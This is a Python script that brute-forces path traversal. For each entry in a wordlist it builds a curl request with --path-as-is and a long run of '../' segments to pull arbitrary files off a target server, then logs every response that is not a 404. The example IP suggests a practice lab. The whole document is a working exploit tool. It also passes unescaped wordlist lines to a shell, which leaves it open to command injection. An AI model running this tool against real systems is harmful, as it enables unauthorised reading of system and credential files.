import subprocess
import argparse
import time

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Send curl requests with test parameters from a dictionary file")
parser.add_argument("-l", "--ip", required=True, help="Server IP address (e.g. 10.10.242.131)")
parser.add_argument("-p", "--port", required=True, type=int, help="Port number (e.g. 8888)")
parser.add_argument("-w", "--wordlist", required=True, help="Path to the dictionary file with 'test' parameters")
parser.add_argument("-o", "--output", required=True, help="Path to the log output file (e.g. log.txt)")
args = parser.parse_args()

log_file = args.output

# Open log file in append mode
with open(log_file, "a") as log:
    # Read each line from the provided dictionary file
    with open(args.wordlist, "r") as file:
        for line in file:
            test_param = line.strip()  # Get the "test" parameter
            if test_param:
                # Prepare the curl command
                command = f"curl --path-as-is http://{args.ip}:{args.port}/../../../../../../../../../../../../../../../../../../../../{test_param}"
                
                try:
                    # Execute the command and capture the output
                    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
                    
                    # Decode the output with a fallback to 'ignore' for problematic characters
                    stdout = result.stdout.decode('utf-8', errors='ignore')
                    stderr = result.stderr.decode('utf-8', errors='ignore')

                    # Check if the response contains "404 Not Found"
                    if "404 Not Found" in stdout:
                        print(f"File {test_param} not found...")
                    else:
                        print(f"File {test_param} found... saving to log file.")
                        # Log the successful response
                        log.write(f"Command: {command}\n")
                        log.write(f"Response:\n{stdout}\n")
                        log.write(f"Error (if any):\n{stderr}\n")
                        log.write("="*80 + "\n")

                    # Sleep for 0.5 seconds between requests
                    time.sleep(0.5)

                except subprocess.TimeoutExpired:
                    print(f"File {test_param} timed out.")
                    log.write(f"Command: {command} timed out.\n")
                    log.write("="*80 + "\n")
